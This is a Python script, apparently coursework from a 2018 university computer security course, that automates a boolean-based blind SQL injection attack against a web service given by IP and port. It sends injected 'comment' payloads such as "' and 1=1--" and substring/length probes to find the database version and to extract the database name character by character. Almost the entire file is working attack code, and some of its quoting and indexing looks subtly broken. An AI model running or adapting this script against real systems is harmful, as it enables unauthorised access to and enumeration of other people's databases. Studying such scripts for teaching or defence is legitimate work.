#! /usr/bin/env python

# Security in Computer Systems 2018 - SDU.
# Automated boolean-based SQL injection attack.
# @CarlosViescasHuerta.

import requests
import json
import time
import sys

# Define globals
t_ip = sys.argv[1]
t_port = int(sys.argv[2])
targetSite = 'http://' + t_ip + ':' + str(t_port)
dicc = {0: "a", 1: "b", 2: "c", 3: "d", 4: "e", 5: "f", 6: "g",
        7: "h", 8: "i", 9: "j", 10: "k", 11: "l", 12: "m", 13: "n", 
        14: "o", 15: "p", 16: "q", 17: "r", 18: "s", 19: "t", 20: "u", 
        21: "v", 22: "w", 23: "x", 24: "y", 25: "z", 26: 0, 27: 1, 
        28: 2, 29: 3, 30: 4, 31: 5, 32: 6, 33: 7, 34: 8, 
        35: 9}

def vulnerable():
    
    global true
    global false

    v1 = "' and 1=1--"
    v2 = "' and 1=2--"
    p1 = {"cell_id":2, "comment": v1, "event": "PML_Execute"}
    p2 = {"cell_id":2, "comment": v2, "event": "PML_Execute"}
    
    respT = requests.post(targetSite, json=p1)
    respF = requests.post(targetSite, json=p2)
    true = json.loads(respT.text)
    false = json.loads(respF.text)

def get_sql_version():

    sql_v = 0
    version = False # Verifier
    i = 0 # Counter

    while (version == False):
        
        v1 = "test’ or substring(@@version,1,1)=" + str(i) + "#"
        p1 = {"cell_id":2, "comment": v1, "event": "PML_Execute"}
        resp = requests.post(targetSite, p1)
        if json.loads(resp.text) == true:
            sql_v = i
            version = True
        else:
            i = i + 1
            version = False
    
    print("Database version = " + str(sql_v))
    return sql_v

def get_name_length():

    name_len = 0
    l = False # Verifier
    i = 0 # Counter

    while (l == False):
        
        v1 = "test’ or length(database())=" + str(i) + "#"
        p1 = {"cell_id":2, "comment": v1, "event": "PML_Execute"}
        resp = requests.post(targetSite, p1)
        if json.loads(resp.text) == true:
            name_len = i
            l = True
        else:
            i = i + 1
            l = False
    
    print("Database name length = " + str(name_len))
    return name_len

def get_name(name_len):

    db_name = []
      
    for i in range (0, name_len):
        for j in range(0, 35):
            v1 = "test’ or substring(database()," + str(i) + ",1)=’" + str(dicc[j]) + "’#"
            p1 = {"cell_id":2, "comment": v1, "event": "PML_Execute"}
            resp = requests.post(targetSite, p1)
            if json.loads(resp.text) == true:
                db_name.append(dicc[j])
                break
            else:
                j = j + 1
        i = i + 1
    
    return db_name


# Get from server
response = requests.get(targetSite)

print("Status code: " + str(response.status_code))
print("Encoding: " + str(response.encoding))
#print("Text: " + response.text)
print("Header: " + str(response.headers))
print("Response time: " + str(response.elapsed.total_seconds()))



##########
# Attack #
##########
print("\n \n \n***** Boolean-based SQL injection attack. *****")
print("Checking vulnerabilities")
vulnerable()
vv = get_sql_version()
nl = get_name_length()
name = get_name(nl)
print("Database name: ")
for i in range (0, len(name)):
    print(name[i])